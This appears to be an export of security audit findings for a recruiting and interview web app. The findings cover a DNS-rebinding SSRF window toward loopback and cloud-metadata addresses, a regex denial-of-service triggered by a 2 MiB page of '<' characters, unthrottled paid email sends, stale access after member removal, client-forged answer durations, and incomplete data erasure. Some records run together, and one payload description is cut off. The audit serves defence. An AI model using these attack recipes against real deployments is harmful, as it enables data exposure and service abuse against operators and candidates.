title: Job-ad fetch validates the addresses dns.lookup returns but lets fetch resolve the hostname again, leaving a DNS-rebinding window to loopback and link-local targets
description: fetchJobPage validates every hop twice: lexically through assertPublicHttpUrl (convex/lib/safeUrl.ts) and then by resolving the hostname with dns.lookup(..., { all: true }) and rejecting any private answer (convex/jobImportFetch.ts:56-71, called at 115). It then calls global fetch on the same URL (117) with no dispatcher, agent or lookup override — I grepped convex/ and src/ and found no setGlobalDispatcher, no undici Agent and no dns.setDefaultResultOrder anywhere — so undici performs its own resolution when it connects. A hostname served by an attacker-controlled resolver with TTL 0, alternating a public address with 127.0.0.1 or 169.254.169.254, can therefore pass the check and be connected to at a private address. The source states the gap in two places (jobImportFetch.ts:24-26 and safeUrl.ts:16-19) and attributes it to fetch not letting the connection be pinned; that is true of the WHATWG fetch options, but Node's undici does accept an Agent with connect.lookup, so the gap is closable in this stack. The channel is readable, not just reachable: the reply is accepted only if it is 2xx with content type text/html, application/xhtml+xml or text/plain (152), and its body is then summarised by a model and returned to the recruiter as a draft (convex/jobImport.ts:86-111). What cannot be settled from source is whether the deployed Convex Node runtime's resolver actually re-resolves between the check and the connect (a cache honouring a minimum TTL would close the window in practice), and what, if anything, answers on loopback or link-local from that runtime with an allow-listed content type. Without those two facts there is no observable result, only a race that the code shape permits.
claimed_root_cause: The address that passed the private-range check is not the address the request is sent to: assertResolvesPublicly (convex/jobImportFetch.ts:56-71) and fetch (convex/jobImportFetch.ts:117) resolve the hostname independently, so the guard is a time-of-check/time-of-use race against a DNS record the requester controls. The same applies to each redirect hop, which is re-validated (130) and then re-fetched the same way.

trace.description: Public Convex action taking a caller-supplied `url` string; authorises via requireProjectEditable and the per-user jobImport limiter, then passes the URL to the Node fetcher at line 76. The caller chooses the hostname, hence the DNS record behind it.

assertResolvesPublicly(current) is awaited before each hop; it rejects a literal private host (58) and every address returned by lookup(url.hostname, { all: true }) that is private (61-70). The resolved addresses are checked and then discarded — nothing carries them forward.

fetch(current, { redirect: 'manual', signal, headers }) — the connection. No dispatcher or lookup binds it to the addresses just checked, so undici resolves the hostname again and connects to whatever it answers with at that moment.

Whatever the connection returned, once it passed the 2xx and content-type gates, becomes pageText and is sent to the model, whose draft is returned to the recruiter — which is what would make a successful rebind a read primitive rather than a blind one.

evidence.description: Author comment: 'What none of this closes: an attacker who controls a DNS record and moves it between our resolution and our connection. Fixing that means connecting to the address we checked, which `fetch` does not let us choose.'
`addresses = await lookup(url.hostname, { all: true })` — the checked resolution; its results are only iterated over at 68-70 and never reused for the connection.
`await fetch(current, { redirect: "manual", signal: AbortSignal.timeout(FETCH_TIMEOUT_MS), headers: {...} })` — the connection, with no `dispatcher` option and no custom lookup.

Each redirect Location is resolved against the current URL and re-validated from scratch, so the redirect class is closed — the residual is specifically the resolution/connection gap, on every hop including the first.

Content-type allow-list is applied only after the request has been sent; a non-allow-listed reply is discarded (the fetch still happened — blind), while a text/html, application/xhtml+xml or text/plain reply is read and becomes model input.
Second acknowledgement of the same residual: 'What this cannot do: stop an attacker who controls a DNS record and changes it between our resolution and the connection.'
Only a page yielding fewer than MIN_USABLE_TEXT = 400 characters is rejected ('page_too_thin'), so a sufficiently verbose internal page would be summarised and returned rather than dropped.

blockers: Resolver behaviour of the deployed Convex Node action runtime is not observable offline: whether getaddrinfo results are cached between assertResolvesPublicly's lookup and undici's connect, and whether a TTL-0 record is honoured or floored by a local caching resolver, decides whether the window exists in practice at all.

Which loopback or link-local services are reachable from that runtime (a function-runtime control API, a cloud metadata endpoint, a sidecar) and whether any of them answers 2xx with text/html, application/xhtml+xml or text/plain is a deployment fact, not a source fact; without one the result is a blind GET rather than a disclosure, and the impact cannot be scored.

The race cannot be exercised end to end locally: convex/jobImportFetch.ts imports `convex/values` and `./_generated/server`, which resolve into the absent node_modules (confirmed — loading it in the sandbox fails with ERR_MODULE_NOT_FOUND for the package `convex`), and the sandbox has no network namespace with interfaces, so no real resolver or connection can be observed.

validation_plan.local: Bounded fixture, no network: copy the hop loop of fetchJobPage into a scratch module that takes `lookup` and `fetch` as parameters (or load convex/jobImportFetch.ts under a loader hook that stubs `convex/values` and `./_generated/server`, the technique the hunters used for other Convex modules). Drive it with a lookup stub that answers [{address:'93.184.216.34'}] on its first call and [{address:'127.0.0.1'}] on every later call, and a fetch stub that itself calls the same lookup before 'connecting' and records the address it would have connected to; assert the recorded address is 127.0.0.1 although assertResolvesPublicly passed. Then re-run with the proposed remediation — an undici Agent whose connect.lookup returns exactly the addresses assertResolvesPublicly accepted — and assert the recorded address is 93.184.216.34. This establishes the code shape and that the fix closes it; it cannot establish blockers 1 and 2, which remain deployment facts.
validation_plan.deployment: On a staging deployment only, never production and never third-party infrastructure: the owner points a hostname they control at a DNS server they control, serving A records with TTL 0 that alternate between an address of a listener they own and 127.0.0.1 (then, separately, the runtime's link-local metadata address), runs importFromUrl against it a handful of times from a test account, and reads the Convex action logs plus their own listener and resolver logs to see whether any connection reached the private address and how many resolutions the runtime actually performed. In the same session, from a one-off internal Node action, enumerate which loopback and link-local endpoints answer at all and with which content types, to size the impact — or to establish that nothing reachable is readable, which would make this hardening rather than a finding.

title: Job-ad import runs quadratic tag-stripping regexes over the full 2 MiB fetched body before truncating, so one small hostile page burns a whole Node action lifetime of server CPU
description:
importFromUrl (convex/jobImport.ts:60) fetches a recruiter-supplied URL through the Node action fetchJobPage, which accepts up to MAX_PAGE_BYTES = 2 MiB of decoded body (convex/jobImportFetch.ts:38, 84) with content type text/html, application/xhtml+xml or text/plain (line 39). The whole body is then handed to jobPostingText and htmlToText (convex/jobImport.ts:86-87). htmlToText assigns the body unsliced (convex/lib/htmlText.ts:63) and applies backtracking regexes to all of it: the per-dropped-element pair at lines 67 and 71, the block-tag pass at 76 and the generic strip /<[^>]+>/g at 77; the 12 000-character truncation is the last operation, at line 84. On input that is a run of tag openers with no '>' anywhere, [^>]* / [^>]+ consume to the end of the string at every start position and then backtrack, which is quadratic in the accepted size. I re-measured this in the parent sandbox on the unmodified module: the generic strip alone grows x4.00, x4.02, x4.01 per doubling (8 KiB to 64 KiB), i.e. textbook O(n^2), and accounts for essentially all of htmlToText's cost; htmlToText itself takes 1 707.8 ms at 64 KiB and 6 866.5 ms at 128 KiB, while a benign 2 MiB page of

...

prose takes 122.7 ms. Both doublings extrapolate to about 1 750 s (~29 minutes) of pure CPU at the 2 MiB the fetcher accepts. Any self-registered user who creates an organisation and a project (both open: convex/organizations.ts:74-106, convex/projects.ts:174-182) can point the wizard's 'Import from URL' at a static file of this shape, or hand the link to a recruiter; each request pins one Node action, at the operator's compute cost, until the platform kills it. The per-user limiter allows 5 immediately and then 20 per hour (convex/rateLimiters.ts:35), which bounds volume per account, not per deployment, and a new account brings a fresh quota.
root_cause: convex/lib/htmlText.ts bounds its output but not its work: htmlToText takes the body as-is (line 63) and applies character classes that can cross the whole remaining string ([^>]* at 67, 71, 76 and [^>]+ at 77) plus a lazy cross-tag scan ([\s\S]*? at 67), slicing to maxLength only at line 84; jobPostingText runs the same shape of matcher at 87-88 and re-enters htmlToText per JSON-LD field at 144. convex/jobImport.ts:86-87 feeds the complete 2 MiB body from readCapped into both with no parse budget, no incremental parser and no wall-clock guard around parsing.
intended_behavior: The transfer cap exists precisely so that a page the recruiter did not author cannot consume the action's resources — the comment at convex/jobImportFetch.ts:37 states the cap is 'enough for any job ad' because 'htmlToText keeps 12 000 characters of it anyway', and jobImportFetch.ts:20-22 records that an earlier build was fixed because materialising the whole body 'took the action's memory with it'. Parsing an accepted body should therefore cost time linear in its size, so that the 2 MiB cap is a real bound on the work an import can cause.

It authorises through internal resolveImportContext -> requireProjectEditable (52-58) and consumes the per-user jobImport limiter (72) — both bound who may call and how often, neither bounds the work one call causes.
Calls internal.jobImportFetch.fetchJobPage with the caller URL and binds the whole returned page to `html`.

Returns `await readCapped(response)`, the decoded body, after readCapped stops pulling at MAX_PAGE_BYTES = 2 MiB (38, 84). This is the only size bound anywhere on the path, and it is a bound on bytes, not on parse work.
jobPostingText(html) at 86 and htmlToText(html) at 87 are both invoked on the complete body; nothing between the fetch and these calls slices, streams or time-boxes it.

`.replace(/<[^>]+>/g, ' ')` — the dominant cost. On a run of '<' with no '>' the class consumes to end of input at every start position and then backtracks; measured in isolation at x4.00/x4.02/x4.01 per doubling and 1 722.6 ms at 64 KiB, against 1 707.8 ms for the whole of htmlToText on the same input. `.slice(0, maxLength)` at 84 runs only after this.

Per dropped element (script, style, noscript, template, svg, head, nav, footer, iframe — 9 passes): `<tag\b[^>]*>[\s\S]*?</tag\s*>`, an unbounded class followed by a lazy scan to the end of input for every unclosed opener.

Generic strip `<[^>]+>`; measured in isolation on '<'-only input at x4.00/x4.02/x4.01 per doubling, 1 722.6 ms at 64 KiB.
`.slice(0, maxLength)` — the 12 000-character cap is the final operation, after every regex pass has already run over the full body.

MAX_PAGE_BYTES = 2 * 1024 * 1024 is the accepted input size, and the comment at 37 justifies it on the assumption that 'htmlToText keeps 12 000 characters of it anyway'.
ALLOWED_CONTENT_TYPES includes 'text/plain', so the hostile body need not even look like a web page — a plain file of '<' characters is accepted and parsed.

`create` requires only requireAppUser, so any verified self-registered account can create an organisation and become its owner; convex/projects.ts:182 then requires only org membership to create the project the import needs.

The hostile page must be served from a public host that passes the lexical and DNS checks, answer 2xx with content type text/html, application/xhtml+xml or text/plain, and be at most 2 MiB after decompression. A static file on any ordinary web host meets this; it compresses to a few KiB on the wire.
The payload must contain a long run of tag openers with no '>' — e.g. 2 MiB of '<', or of '

remediation.strategy: Bound the parse work, not only the transfer. The load-bearing change is to make every character class unable to cross the next '<' or '>' ([^<>] instead of [^>]) so each match attempt is bounded by the distance to the nearest delimiter rather than by the length of the document, and to replace the lazy cross-tag scan for dropped elements with an indexOf-driven loop that never re-scans. Slicing the body to an explicit parse budget before any regex is a second, independent bound: on its own it is not sufficient (256 KiB of '<' still costs ~27 s with the current classes), but with the class fix it makes the worst case provably small. Add the regression test below so widening the classes back to [^>] fails loudly. Two review notes on the version of this fix proposed by the hunter: text.toLowerCase() must be hoisted out of the dropElement loop, otherwise a page with many openers reintroduces the same O(n^2) through the lowercasing itself; and jobPostingText must slice to the budget too, since its own matcher has the same shape. Separately (different root cause, not fixed by this change): decodeEntities should guard String.fromCodePoint against values above U+10FFFF.

likelihood.reason: No exotic preconditions: email+password self-registration is open, organisation and project creation are self-service, and the payload is a static file that compresses to a few KiB. The per-user limiter (5 burst, 20/hour) caps one account’s volume but not the deployment’s, and each new account brings a fresh quota. The same link handed to a recruiter needs no attacker account at all. Held at medium rather than high because the caller must hold a verified account or find a recruiter to click, and the shape of the payload is unusual enough that it will not occur by accident.

impact.reason: Demonstrated effect is disproportionate server CPU: a request whose payload is a few KiB on the wire converts into roughly 29 extrapolated minutes of synchronous parse work, pinning one Node action invocation until the platform’s execution limit kills it, at the operator’s compute cost, and failing the requester’s own import. No data crosses a trust boundary, nothing is written, and Convex runs actions in isolated invocations, so other users are reached only through deployment-level action concurrency and billing — which was not observed here and is therefore not claimed. Recovery is automatic once the invocation is killed; nothing is retained.

confidence.reason: The source path from the 2 MiB cap to the regexes was re-read line by line at HEAD 9a70f3f with no intervening bound, and the superlinear behaviour was re-measured independently of the hunter, including the bare regex from htmlText.ts:77 in isolation, which grows at x4.00/x4.02/x4.01 per doubling and accounts for the whole cost. Only the platform-side ceiling (Convex action timeout, concurrency, billing) is inferred rather than observed, and the record is scored so that the verdict does not depend on it.

title: notifyPasswordChanged is a public, unthrottled mutation that performs one paid Resend send per call, with no application rate limit and no binding to an actual password change
description: convex/notifications.ts exports notifyPasswordChanged as a public Convex mutation whose only guard is requireAppUser; it then unconditionally sends one 'password changed' email through Resend. Every sibling email sender in the codebase passes through consumeLimit (invitations.ts:31, sessions.ts:260, auth.ts:116/146/301), and notifications.ts neither imports consumeLimit nor has a bucket in convex/rateLimiters.ts. Nothing ties the call to a real password change — the client merely fires it after authClient.changePassword succeeds (src/routes/app/me.tsx:177) — so Better Auth's /change-password limit of 5/min does not apply to direct calls of the mutation. The recipient is always the caller's own stored address, so this is not a way to mail a third party; the shared resource at risk is the operator's single Resend account and the @convex-dev/resend component queue, which every tenant's candidate invitations, magic links and verification mails also use. Locally confirmed that 50 consecutive calls by one plain registered user produce 50 provider sends with zero rejections. What remains unknown, and is decisive for whether this is a cross-tenant availability problem or merely operator cost, is the Resend account's quota and its behaviour on overrun.
claimed_root_cause: A public mutation that performs a paid provider call has no consumeLimit and no LimitName entry in convex/rateLimiters.ts, and is not bound to the state change it reports, so the per-call cost is attacker-controlled and the only bound is whatever the Resend account and the Convex platform impose out of band.

trace.description: notifyPasswordChanged is declared with `mutation`, i.e. public, and takes empty args, so any authenticated Convex client can call it directly and repeatedly. Its intended caller is src/routes/app/me.tsx:177 after a successful changePassword, but nothing binds the mutation to that event.
requireAppUser establishes identity only — it resolves the users row for the Better Auth session and returns. No consumeLimit call follows, and the module does not import it.

resend.sendEmail performs one provider send per call to the caller's own stored address, with the @convex-dev/resend component persisting the message; the count is bounded by nothing in the repository.

evidence.description: The rateLimiter configuration defines ten buckets (invitationCreate, magicLinkSend, verificationSend, passwordResetSend, chatSend, jobImport, candidateInvite, candidateRead, candidateWrite, shareView); none covers post-event notifications.
The LimitName union lists exactly those ten names, so no bucket exists that notifications.ts could consume even if it imported the helper.
consumeLimit is the shared guard every other email-sending path calls; convex/notifications.ts never imports it (verified by grep across convex/).
Comparable sender: invitations.create consumes the invitationCreate bucket keyed on the inviter before sending — the pattern notifyPasswordChanged omits.
Comparable sender: resendInvitation consumes candidateInvite keyed on the recruiter before sending.
Comparable sender: Better Auth's sendResetPassword consumes passwordResetSend keyed on the recipient email before sending.

The client fires the mutation fire-and-forget after authClient.changePassword resolves; the Better Auth /change-password rule of 5 per 60 s (convex/auth.ts:70) applies to the BA HTTP route, not to a direct Convex call of this mutation.

emailAndPassword signup is enabled with requireEmailVerification, so reaching the entrypoint costs an attacker one verified mailbox and one account — a low but non-zero bar, and any existing legitimate user already has one.
resend testMode is true unless RESEND_TEST_MODE is exactly 'false'; a production deployment must set it false, at which point every call is a billable, deliverable send.

blockers: The Resend account's monthly and per-second quotas and its overrun behaviour are account settings outside the repository. Whether N unthrottled self-sends degrade or block other organisations' candidate invitations, magic links and verification emails (a shared-tenant availability effect) or merely bill the operator (a cost-only effect) cannot be decided from source, and that difference is what separates a finding from hardening under the resource-exhaustion rules.

The @convex-dev/resend component's queue semantics — whether it batches, back-pressures, drops or retains an unbounded persisted backlog of queued messages, and how that interacts with the provider's per-second limit — live in node_modules, which is absent and must not be installed, so the retained-resource dimension cannot be observed locally.

Convex platform-level per-deployment mutation and scheduled-function rate limits, which would cap the achievable call rate independently of the application, are a deployment/plan fact with no source-visible representation in this repository.

validation_plan.local: The source-side half is already settled offline and needs no dependencies: scratch/notify-password-loop.mjs runs the real convex/notifications.ts notifyPasswordChanged handler (with convex/lib/auth.ts and convex/emailTemplates.ts real, and only convex/values, convex/server, convex/_generated/*, convex/auth.ts and convex/email.ts stubbed) for one dummy registered user with no org membership, 50 consecutive calls, no password change in between; observed 50 provider sendEmail invocations, 0 rejections, single recipient attacker@example.test, subject 'Your interw password was changed' — transcript at scratch/notify-password-loop.log. To close the remaining gap once dependencies can be installed, add a convex-test case in convex/guards.test.ts with the resend component stubbed as that suite already does, asserting the same count; then add a 'passwordChangedNotify' token bucket to convex/rateLimiters.ts (for example rate 5, period HOUR, capacity 2, keyed on user._id), call consumeLimit before the send, and assert that the call after the capacity is exhausted throws ConvexError with code 'rate_limited' while the first ones still succeed.
validation_plan.deployment: Ask the operator to report, from the Resend dashboard and plan for the account whose key is set as the Convex deployment's RESEND_API_KEY, three facts, with no audit traffic sent to the deployment: (1) the monthly send quota and the per-second send rate on the current plan; (2) what the API returns once the quota is exceeded — a hard 4xx that fails subsequent sends, or overage billing that keeps delivering; (3) whether transactional invitations, magic links and verification emails share that same account and quota rather than a separate key or domain. A hard-fail quota shared across all tenants makes this a cross-tenant availability finding; overage billing with delivery continuing makes it an operator-cost hardening item. Also ask whether RESEND_TEST_MODE is unset or 'false' in the production Convex deployment.

title: Removing an organisation member leaves their projectShares row and createdBy attribution in place, so they keep receiving candidate report emails and regain restricted-role visibility if re-invited
description: convex/organizations.ts removeMember deletes only the organizationMembers row. Two authorisations keyed on the same user id survive it: the projectShares rows that named the person on restricted roles, and the createdBy attribution on any role they created. convex/notifications.ts sendReportReady, which the pipeline runs after every generated report, builds its recipient list from exactly those two sources and never consults organizationMembers, so every interview completed after the removal emails the ex-member the candidate's name, the job title, the overall score and the recommendation. The surviving share row also makes convex/lib/projectAccess.ts canSeeProject return true again the moment the same person is re-invited as a plain member, restoring read access to a role they were never re-granted. Affected owner: the recruiter organisation. Lower-trust principal: an ex-member whose access was explicitly revoked. Protected data: candidate PII and AI assessment results. Reproduced locally against the real handlers.
root_cause: removeMember treats the organizationMembers row as the only authorisation to revoke. projectShares is a derived grant that setShares (convex/projects.ts:396-403) only ever issues to a current member, yet it is deleted at just two sites — project removal (projects.ts:375) and a later setShares (projects.ts:413) — neither of which runs on member removal. sendReportReady then trusts project.createdBy (notifications.ts:81) and every projectShares.userId (notifications.ts:87) as its audience with no membership re-check; its only filter (notifications.ts:100) skips a user whose users row is gone, which a removed member's is not. canSeeProject (lib/projectAccess.ts:36-42) trusts the same persisted row once membership is re-established.
intended_behavior: Removing a member is a revocation: after it, no later operation should act on that person's behalf inside the organisation, and no organisation data should reach them. title: The assessed candidate supplies the answer length that drives the recruiter report's para-verbal "measurements" and every quote anchor
description: The length of each answer is reported by the candidate's own browser. interview.markSegmentUploaded takes durationSeconds: v.number() from the candidate (token-gated, no other caller) and stores Math.max(0, Math.round(...)) on the segment with no upper bound and no cross-check against anything the server observed. pipeline.reportInputs copies that number into the report inputs, generateReport hands it to computeParaverbal, and buildReport hands it to chooseStartSeconds for every evidence quote and to the highlight clamp. The recruiter page and the public share page then present the result as measured fact: the Delivery card is titled with the copy "Measured from the transcript timings, not judged by a model" (src/locales/en/report.json:56) and the schema calls the section "Computed, not generated" (convex/schema.ts:207). Reproduced locally: for one unchanged, provider-timed transcript, sending 8 vs 60 seconds moves concision 0.5 -> 10 and engagement 1.4 -> 10 (pace 10 -> 0); for a 100-word answer actually recorded over 120 s, claiming 48 s moves pace 0 -> 10, concision 2.5 -> 10 and silence 9.7 -> 4.2. Independently, a forged duration of 1 drags every anchored citation to 0:00 while the report still flags it anchored: true, so the "jump to 0:12" buttons on both the recruiter page and the share page land on the wrong moment — the exact failure the code comments in convex/lib/evidence.ts:84-90 and convex/lib/ai.ts:199-203 say must never be produced. The server already holds an unforgeable length (the provider's usage.total_seconds, returned as audioSeconds by lib/ai.ts:217) and uses it only for a jobLog row.
root_cause: convex/pipeline.ts:reportInputs (line 472) propagates segment.durationSeconds — a raw client argument accepted at convex/interview.ts:380-401 with only a floor at 0 and a rounding — as the authoritative answer length for computeParaverbal and chooseStartSeconds, instead of deriving it from data the server observed (the provider's usage.total_seconds already returned by convex/lib/ai.ts:217 but only written to jobLog at convex/pipeline.ts:283, or the last transcript chunk end stored by saveTranscript), and without bounding the stored value by the question's maxResponseSeconds at write time.
intended_behavior: The para-verbal dimensions and the quote timecodes are deterministic measurements over data the product itself observed, as the schema comment and the recruiter-facing copy both state. A candidate must be able to influence their own assessment only through what they actually said and how they actually said it, never by reporting the measurement.

trace.description: Public mutation whose args (line 384) include durationSeconds: v.number(), supplied by whoever holds the candidate session token; requireOpenSession (line 388) uses the server clock, so the only precondition is an open session.

Patches the segment with durationSeconds: Math.max(0, Math.round(durationSeconds)) — no upper bound, no finiteness check, no comparison with the question's maxResponseSeconds or with any server-observed timing.
Copies segment.durationSeconds ?? null into the per-answer report input, alongside maxResponseSeconds (line 473) taken from the question.
Passes answer.durationSeconds ?? 0 to computeParaverbal (called at line 615); the result is persisted by saveReport into reports.paraverbal (line 626, schema.ts:507).

Passes answer.durationSeconds into chooseStartSeconds for every evidence quote (called for criterion evidence at line 119 and for each evaluation at line 141); the same number clamps every highlight clip at line 162.

answer.durationSeconds / answer.maxResponseSeconds is the usage ratio that scores concision (line 209) and engagement (line 229); the same number is the denominator of wordsPerMinute for pace (lines 142-147, 176), of the silence ratio for pauses (lines 151-155, 197) and of the answer-length spread for consistency (lines 165-169, 219). It is also the filter that decides whether an answer counts at all (line 132).

The transcript-resolved offset is clamped with Math.min(resolved, Math.max(0, durationSeconds - 1)), so a forged small duration overrides the authoritative transcript timing while the quote is still returned with anchored: true (reportBuilder.ts:93).

Renders each para-verbal dimension's score and raw measure to the recruiter under copy asserting they are measured from transcript timings; the clamped startSeconds drives the seek buttons at lines 336 and 452.

evidence.description: Recruiter-facing copy for the Delivery card: "Measured from the transcript timings, not judged by a model." Three of the six numbers under it (Time used, Engagement "seconds spoken", and the denominator of Speaking rate) come from the candidate's argument, not from transcript timings.
"Computed, not generated — see paraverbalDimensionValidator"; the block at lines 100-110 states the product must not present an invention as a measurement.
The honest client derives durationSeconds from Math.round((Date.now() - this.startedAt) / 1000) in the browser — client data by construction, with nothing the server can check it against.
That browser-computed value is sent verbatim as the durationSeconds argument of api.interview.markSegmentUploaded, so an attacker only has to replace one number in an ordinary client call.
segments.durationSeconds is an unconstrained optional number; nothing in the schema bounds it by the question's maxResponseSeconds.
transcribe() returns audioSeconds from the provider's usage.total_seconds — an unforgeable server-observed length that is available for every segment.

That provider-measured length is passed only to recordJob as jobLog.audioSeconds; saveTranscript (lines 204-232) never writes any server-measured duration back onto the segment, so the client number is never corrected.
Highlight clips are clamped to the same client-reported duration, so a forged small value also truncates or collapses every highlight the report offers.

The module's own contract: "A quote with no timestamp is still worth showing; a wrong timestamp is not." The client-controlled clamp at line 106 produces exactly a wrong timestamp that is still marked anchored.

The same paraverbal object and anchored evidence are returned to any holder of a report share link (validator at line 191), so the forged numbers are not confined to the recruiter's own session page (share page seek button: src/routes/r/$shareToken.tsx:212).

conditions.description: Attacker holds a valid candidate session access token (the invited candidate, or anyone the invitation link was forwarded to). No account, no org membership and no recruiter privilege.

The recruiter — and anyone holding a share link — sees those numbers on the Delivery card under copy stating they were measured from the transcript timings.

title: projects.restore is guarded one tier below projects.archive: any member who can see an archived role reverses the archival, edits its frozen questions and reopens every closed candidate link
description: projects.archive was deliberately raised to requireProjectOwnerOrAdmin (owner, admin or the project's creator) because archiving closes every candidate link of the role at once, and requireProjectEditable freezes archived projects so their questions and criteria cannot be changed after the fact. projects.restore, the exact inverse transition, still uses requireProjectAccess, which any org member who can see the project satisfies with no role check. A plain member (role 'member', not the creator) therefore calls restore on an archived project (status -> draft), which lifts the archived freeze: questions.update and criteria.update succeed again, and projects.publish (also member-level, requireProjectEditable) puts the project back to active, at which point evaluateSessionGate reports every still-pending session of that project as 'ready' instead of 'closed'. The member has undone an owner/admin decision, rewritten what past and future candidates are asked, and reopened links the admin closed. The visibility layer still applies — restore on a restricted project the member is not named on fails not_found, verified locally — so the defect is strictly the missing role tier, not a visibility hole.
root_cause: convex/projects.ts:328 guards `restore` with requireProjectAccess (org membership + project visibility, convex/lib/projectAccess.ts:50-65) while the paired `archive` at convex/projects.ts:315 requires requireProjectOwnerOrAdmin (convex/lib/projectAccess.ts:88-104). The archived freeze in requireProjectEditable (convex/lib/projectAccess.ts:81-83) and the publish transition (convex/projects.ts:289) are both member-level, so the only privileged step in the archive lifecycle is one-directional and any member can walk the state back.
intended_behavior: The doc comment at convex/projects.ts:302-311 states that archiving 'is no longer unprivileged' precisely because it cuts every candidate's link at once; the state that decision produces (archived, frozen questions, closed links) should only be reversible by the same tier that produced it — owner, admin, or the project's creator — exactly as requireProjectOwnerOrAdmin defines it.

trace.description: A plain org member calls the public mutation restore with the id of an archived project of their own org.

The project row is patched to status 'draft' and archivedAt is cleared.
The archived freeze only throws project_archived while status === 'archived', so the restore just performed lifts it for the same caller.
The same member now edits the content of a question of the previously frozen role, because requireProjectEditable succeeds on a draft project.
publish requires only requireProjectEditable, so the same member sets the project back to status 'active'.

The gate returns 'closed' for any project whose status is not 'active'; with the project active again every still-pending session of the role is 'ready' and its candidate can record against the rewritten question set.

evidence.description: archive calls requireProjectOwnerOrAdmin — the tier the paired transition uses.

Doc comment: archiving is 'the most destructive unprivileged action in this module, so it is no longer unprivileged'; it cuts every candidate link at once, and the previous asymmetry was 'the wrong way round'.
restore calls requireProjectAccess only — membership plus visibility, no role.
requireProjectEditable throws project_archived only while the status is archived, so restore is what unfreezes questions and criteria.
requireProjectOwnerOrAdmin (admins, owners, or the project's creator) is the tier restore should share with archive.
A regression test asserts a plain member cannot archive a live role; there is no mirror test for restore anywhere in the suite.
The restore mutation is wired into the project list UI with no role condition anywhere in the file, so the action is offered to every member.

title: Erasure deletes application tables only: the Resend component's copy of the invitation mail (address, name, /s/{accessToken} link) and the Agent component's chat threads carrying report content are never removed
description: Both erasure paths — the candidate's `deleteMyData` (convex/candidate.ts:379-402) and the recruiter's `deleteCandidateData` (convex/sessions.ts:341-358) — converge on `purge.deleteSessionRecords`, whose `deleteChildRows` enumerates a closed list of application tables: reports, reportShares, transcripts, segments, sessionEvents, jobLog, emailLog, then the session row (convex/purge.ts:101-149, 160-210). Two other durable stores in the same deployment received candidate data and are never touched. (1) The `@convex-dev/resend` component: `sendInvitation` hands it the candidate's address together with the rendered invitation HTML, which contains the candidate's name and the full `${SITE_URL}/s/{accessToken}` link (convex/sessions.ts:204-218, invitationUrl at 100-104), and `notifications.ts:101-115` hands it the report-ready mail carrying the candidate's name, overall score and recommendation. The component is instantiated with only `testMode` and `onEmailEvent` (convex/email.ts:14-21), and `convex/crons.ts` schedules nothing but the retention purge, so no cleanup function is registered or called anywhere in the repository. (2) The `@convex-dev/agent` component: `chat.sendMessage` persists the user turn through `chatAgent.saveMessage` (chat.ts:180-184) and `chat.streamAsync` persists the model turn with `saveStreamDeltas` (chat.ts:258-264), while `readReportInternal` returns the candidate's name, executive summary, strengths, concerns and per-criterion rationale as a tool result into that thread (recruiterTools.ts:112-175) and `listCandidatesInternal` returns names, scores and recommendations (recruiterTools.ts:98-106). `chat.listMessages` reads the persisted thread back for its owner at any later time (chat.ts:134-155). That the component storage is durable and separately addressable is visible in the repository itself: `chat.deleteThread` exists solely to schedule `components.agent.threads.deleteAllForThreadIdAsync` (chat.ts:99-111) — an API erasure never calls. Meanwhile the candidate is told "Your recordings, transcript, analysis and uploaded documents will be permanently deleted" and afterwards "Nothing from this interview is held any more" (src/locales/en/interview.json:165, 170), the recruiter is told the same (src/locales/en/candidates.json:81), and `purgeLog` records the erasure as complete (convex/purge.ts:200-207). If either component retains its payload durably, an erased candidate's assessment remains readable by the thread owner through the ordinary chat UI, and their address plus a live interview link remains in the deployment's email store.
claimed_root_cause: `deleteChildRows` (convex/purge.ts:101-149) deletes only rows of application tables reachable through a `by_session` index. No erasure hook exists for data held by the Convex components the app writes into: no Resend cleanup function is configured on the component instance (convex/email.ts:14-21) or scheduled (convex/crons.ts:12-17), and no agent-side deletion or redaction is keyed to a candidate even though `chat.deleteThread` shows the component's deletion API is available (chat.ts:99-111). title: Public shares.recordView consumes the rate limiter with a raw, unvalidated token, so an anonymous caller chooses the keys persisted in the rate-limiter component's store
description: convex/shares.ts:recordView is a public Convex mutation whose single argument is token: v.string(), with no length or shape bound. Its first statement (line 284) is consumeLimit(ctx, 'shareView', token), which forwards the raw argument to @convex-dev/rate-limiter as a bucket key (convex/rateLimiters.ts:75). Only afterwards (line 285) does resolveShare run looksLikeToken (line 53) and the by_token index lookup; an unresolved token then returns null at line 286, so the mutation commits and whatever the limiter component wrote for that key is retained. This ordering is unique in the codebase: every other consumeLimit call site either validates the token shape first (convex/candidate.ts:267 before 268), resolves the session first (convex/interview.ts:447 before 448; 490 before 492; 138/251/388/417 via requireOpenSession), or keys on an already-resolved principal (a users._id in sessions.ts, chat.ts, jobImport.ts, invitations.ts; a Better-Auth-resolved recipient address in auth.ts:116, 146, 301). convex/lib/tokens.ts:25-29 states in so many words that the shape gate exists to keep malformed input 'out of the rate limiter's key space' - the invariant recordView is the one function to skip. The Convex deployment URL is inlined into the public client bundle, so the mutation is reachable by anyone, and Convex accepts strings up to the 1 MB value limit. If the component inserts one persistent row per never-seen key on the first (always ok, capacity 30) call and never expires it, each anonymous call durably consumes deployment storage under an attacker-chosen name, with no product path to remove it - but the component's behaviour on that point is not visible from this repository.
claimed_root_cause: Statement ordering in convex/shares.ts:284-285. The rate-limiter component call - a write into component-owned storage keyed by the raw argument - runs before the token shape check and the by_token resolution, inverting the order used at every other limiter call site. The repository's CI access audit does not catch it because scripts/audit-convex-access.mjs:70-77 counts only ctx.db.* and ctx.scheduler.* as writes, and resolveShare is itself in the GUARDS list (line 88), so recordView is reported as guarded-before-write.

trace.description: Exported as `mutation`, so it is callable by any client that knows the deployment URL, which is inlined into the public browser bundle. Its only argument is `token: v.string()` (line 282), with no length or character bound.
`await consumeLimit(ctx, 'shareView', token)` runs before any validation, passing the caller-supplied string through unchanged as the limiter key.

`rateLimiter.limit(ctx, name, { key })` hands the raw key to the @convex-dev/rate-limiter component. `shareView` is a token bucket, rate 120/min, capacity 30 (line 51), so the first call for any previously unseen key is always `ok` and the component records bucket state for it.
`resolveShare(ctx, token, Date.now())` is only reached now; it applies `looksLikeToken` (line 53) and the `by_token` unique lookup (lines 54-57).
A non-active result returns `null` rather than throwing, so the mutation transaction commits normally and any component state written at line 284 is retained.

The limiter component's per-key persisted state is the retained resource. Nothing anywhere in this repository deletes, expires or enumerates rateLimiter keys, so there is no product path to reclaim rows created by unresolvable tokens.

evidence.description: The documented purpose of `looksLikeToken`: it 'keeps obviously malformed input out of the database and out of the rate limiter's key space' - the exact invariant recordView bypasses by calling the limiter first.
